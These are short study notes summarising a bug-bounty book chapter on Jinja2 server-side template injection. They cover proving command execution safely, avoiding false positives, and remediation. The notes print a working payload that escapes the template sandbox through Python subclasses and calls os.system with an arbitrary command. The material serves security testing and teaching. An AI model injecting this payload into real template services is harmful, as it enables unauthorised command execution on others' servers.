# Jinja2 Command-Execution PoC

- After a successful Jinja2 sandbox escape, the chapter chains recovered `__import__` to `os.system()`.
- Core pattern:
```jinja2
{% for x in [].__class__.__bases__[0].__subclasses__() %}
{% if 'catch_warnings' in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').system('COMMAND')}}
{% endif %}
{% endfor %}
```
- For a safe bug-bounty PoC, the chapter recommends creating a uniquely named file rather than damaging the system.
```bash
touch template_injection_by_YOUR_NAME.txt
```
- Verify only the minimal evidence needed to prove system-command execution.
- False-positive trap: shell return codes may appear even when command output is not rendered; verify with a harmless observable effect.
- Remediation: never evaluate untrusted templates; harden sandbox attributes and run the template service with least privilege.
## Source: Bug Bounty Bootcamp, Ch. 16
